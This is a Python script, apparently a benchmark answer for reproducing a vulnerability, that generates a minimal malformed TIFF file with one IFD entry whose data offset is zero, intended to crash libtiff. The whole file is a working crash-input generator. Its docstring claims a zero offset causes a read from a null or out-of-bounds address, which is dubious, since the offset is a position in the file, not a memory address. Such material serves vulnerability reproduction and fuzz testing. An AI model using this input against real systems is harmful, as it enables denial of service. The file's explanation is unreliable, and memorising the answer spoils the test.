import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is in libtiff and is caused by processing a TIFF
        file with an "offline" tag that has a value offset of zero. An offline
        tag is one where its data is too large to fit in the 4-byte value/offset
        field of the IFD entry, so this field is instead interpreted as an offset
        to the data's location elsewhere in the file. An offset of zero is invalid
        and causes the library to attempt a read from an out-of-bounds or null
        address, leading to a crash.

        This PoC constructs a minimal TIFF file containing exactly one such
        malicious tag.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # 1. TIFF Header (8 bytes)
        #    - 'II': Little-endian byte order
        #    - 0x002a (42): TIFF version number
        #    - 8: Offset to the first (and only) IFD, which is immediately
        #      after the 8-byte header.
        header = b'II\x2a\x00\x08\x00\x00\x00'

        # 2. Image File Directory (IFD)
        
        #    - Number of directory entries (2 bytes). We need only one.
        num_entries = b'\x01\x00'

        #    - The malicious IFD entry (12 bytes).
        #      We create a tag that is "offline" (data size > 4 bytes) and
        #      set its data offset to 0 to trigger the vulnerability.
        tag_id = 256       # Tag: ImageWidth
        data_type = 3      # Type: SHORT (2 bytes per value)
        count = 3          # Count: 3 values. Total data size = 3 * 2 = 6 bytes.
        value_offset = 0   # Vulnerability Trigger: An offset of zero.
        
        #      Since the total data size (6 bytes) is greater than 4 bytes,
        #      the `value_offset` field is treated as a pointer to the data.
        #      A pointer of 0 is invalid.
        #      The values are packed into a 12-byte structure using
        #      little-endian format ('<').
        #      Format: H=unsigned short (2b), I=unsigned int (4b)
        ifd_entry = struct.pack('<HHII', tag_id, data_type, count, value_offset)

        #    - Offset to the next IFD (4 bytes).
        #      A value of 0 indicates this is the last IFD.
        next_ifd_offset = b'\x00\x00\x00\x00'

        # 3. Assemble the PoC
        #    The final PoC is the concatenation of these parts.
        #    Total length: 8 (header) + 2 (num_entries) + 12 (ifd_entry) + 4 (next_ifd_offset) = 26 bytes.
        poc = header + num_entries + ifd_entry + next_ifd_offset

        return poc